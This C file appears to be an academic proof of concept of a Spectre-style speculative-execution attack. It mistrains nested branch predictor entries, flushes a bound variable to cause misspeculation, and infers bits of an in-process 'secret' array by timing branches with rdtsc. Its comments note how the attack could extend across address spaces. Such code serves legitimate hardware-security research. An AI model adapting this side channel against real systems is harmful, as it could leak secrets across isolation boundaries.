#include "../../include/util.h"

unsigned int array_size = 0;
uint8_t unused1[64]; // Unused variable to place "array" in different cacheline from "array_size"
uint8_t array[2] = {0,1};
uint8_t unused2[64]; // Unused variable to place "secret" in different cacheline from "array"
uint8_t secret[100] = {0,1,0,0,1,0,1,1,1,0,1,1,0,1,1,0,1,0,0,1,0,0,0,1,1,1,1,1,1,1,1,1,0,1,0,1,0,1,1,1,0,1,0,1,0,1,0,1,0,1,0,0,1,1,0,1,1,0,1,0,1,0,0,1,0,1,0,1,1,0,1,0,0,1,1,0,1,0,1,0,0,0,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,1,1,1};
size_t offset = 0; // Store the address offset between "array" and "secret"
int malicious_offset = 0; // Malicious offset for out-of-bound access to "secret" from "array"

void victim_function(uint8_t x, int y) {
  // Parent branch (x < array_size), to be exploited by attacker to trigger misspeculation, bp
  if (x < array_size) {
    // Conditional nested branch to be exploited in speculative execution, bv
    if (array[y]) {
      asm("nop");
    }
  }
};

void *attacker_thread( void *ptr );
void *victim_thread( void *ptr );

int main() {
  int i = 0;
  int val = 0, biterror = 0;
  const int secret_size = 100;

  /*
   * Threshold latency between correct prediction and mis-prediction
   * This is used in the inference stage of the attacker
   */
  THRESHOLD = 150; // Setup the threshold latency properly

  offset = (size_t)(secret - (uint8_t * ) array);

  pthread_t attacker, victim;
  int ret_a, ret_v;

  printf("Transmitting secret...\n");
  for (i = 0; i < secret_size; i++) {
    ret_a = pthread_create(&attacker, NULL, attacker_thread, (void*)(intptr_t) i);
    ret_v = pthread_create(&victim, NULL, victim_thread, (void*)(intptr_t) i);

    pthread_join(attacker, NULL);
    pthread_join(victim, NULL);

    temp &= ret_a;
    temp &= ret_v;
  }

  for (i = 0; i < secret_size; i++) {
    val = 0;
    if (rdtsc_probe[1][i] < THRESHOLD) val = 1;

    printf("Secret value, secret[%d]: %d; Inferred: %d; Latency: %ld",i,secret[i],val,rdtsc_probe[1][i]);
    if (secret[i] != val) {
      biterror++;
      printf(" error\n");
    } else printf("\n");
  }
  printf("Total bit sent: %d, Total Error: %d, Theshold: %lu\n", secret_size,biterror, THRESHOLD);

  return 0;
}

void *attacker_thread( void *ptr ) {
  int i = (intptr_t) ptr;
  int j;

  for (j = 0; j < 6; j++) {
    /* Activate two level branch predictor for the bv
     * Execute bv with acutal outcome sequence "TNTNTN"
     * This sequence is guaranteed to have atleast 3 mispredictions in
     * one level predictor
     */
    AT12; // Macro to execute 12 taken branch (with same source and destination to flush GHR)
    victim_function(j%2, j%1);
  }

  // Bring "array" to cache so that child branch (bp) is resolved faster
  temp &= array[0];
  mfence();

  /*
   * Prime
   * This is the training phase where the attacker trains bv to strongly taken (and mistrain bp in the path of bv execution).
   * Note that we are performing the training phase by executing the same branches in the
   * victim's code for simplicity purpose (in-place same-address space)
   * Note: terminology from "A Systematic Evaluation of Transient Execution Attacks and Defenses"
   *
   * It is also possible to execute branches in attacker's address space which
   * are congruent to victim's bp and bv.
   */
  AT12;
  victim_function(0, 0);
  AT12;
  victim_function(0, 0);
  AT12;
  victim_function(0, 0);
  AT12;
  victim_function(0, 0);
  AT12;
  victim_function(0, 0);
  AT12;
  victim_function(0, 0);
  AT12;
  victim_function(0, 0);
  AT12;
  victim_function(0, 0);
  // Executed 8 times since 3 bit PHT has eight stages and needs at most 8 execution in one direction to saturate

  malicious_offset = (intptr_t) ptr + offset; // put this as global variable

  flush(&array_size); // Flush "array_size" to speculate bp
  mfence();

  sched_yield(); // Victim thread starts to execute the victim function

  /*
   * Infer
   * This is the inference phase where the attacker try to infer the state
   * of PHTv (PHT entry state for bv) by observing the execution time of the branch
   * that also maps to PHTv.
   *
   * Similar to the prime phase, we use the same branch bv in victim's code in inference
   * state for simiplicity. The attacker can also execute branches that is congruent to
   * bv under a cross address-space attack.
  */
  // First inference phase
  start = rdtsc();
  AT12;
  victim_function(0, 1);
  end = rdtsc();
  // Second inference phase
  AT12;
  victim_function(0, 1);
  // Third inference phase
  AT12;
  victim_function(0, 1);
  // Fourth inference phase
  start_1 = rdtsc();
  AT12;
  victim_function(0, 1);
  end_1 = rdtsc();

  rdtsc_probe[0][i] = end - start;
  rdtsc_probe[1][i] = end_1 - start_1; // Only the fourth inference phase is enought for the attack
  return 0;
}

void *victim_thread( void *ptr ) {
  sched_yield();

  flush(&array_size); // Flush "array_size" to speculate bp
  mfence();

  // Out-of-bound access (Note: malicious_offset is large enough to not fulfil the bp condition)
  victim_function(malicious_offset, malicious_offset);

  sched_yield();
  return 0;
}
